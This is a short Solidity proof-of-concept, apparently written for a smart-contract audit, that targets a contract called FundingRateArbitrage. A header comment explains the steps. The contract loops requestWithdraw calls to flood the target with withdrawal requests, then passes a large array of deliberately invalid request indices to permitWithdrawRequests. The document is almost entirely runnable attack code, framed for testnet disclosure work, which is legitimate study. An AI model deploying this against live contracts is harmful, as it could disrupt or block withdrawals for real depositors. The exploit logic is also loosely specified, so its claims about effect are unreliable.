/* Here is a copy of the runnable poc.  

The Target Contract address should be replaced with the contract address of FundingRateArbitrage or we can deploy both contract on a different testnet.   


This poc Creates Multiple Withdrawal Requests:

Attacker Call the createMultipleWithdrawalRequests function with a large number of requests (e.g., 1000).

Owner can call the submitInvalidIndices function with the same number of requests or any large amount.
e.g 
poc.submitInvalidIndices(5000);    
*/


pragma solidity ^0.8.19;

interface IFundingRateArbitrage {
    function requestWithdraw(uint256 repayJUSDAmount) external returns (uint256 withdrawEarnUSDCAmount);
    function permitWithdrawRequests(uint256[] memory requestIDList) external;
}

contract FundingRateArbitragePOC {
    IFundingRateArbitrage public targetContract;

    constructor(address _targetContract) {
        targetContract = IFundingRateArbitrage(_targetContract);
    }

    function createMultipleWithdrawalRequests(uint256 numRequests) public {
        for (uint256 i = 0; i < numRequests; i++) {
            targetContract.requestWithdraw(1); // Assuming 1 JUSD for simplicity
        }
    }

    function submitInvalidIndices(uint256 numRequests) public {
        uint256[] memory requestIDList = new uint256[](numRequests);
        for (uint256 i = 0; i < numRequests; i++) {
            requestIDList[i] = i + 1000; // Intentionally invalid indices
        }
        targetContract.permitWithdrawRequests(requestIDList);
    }
}
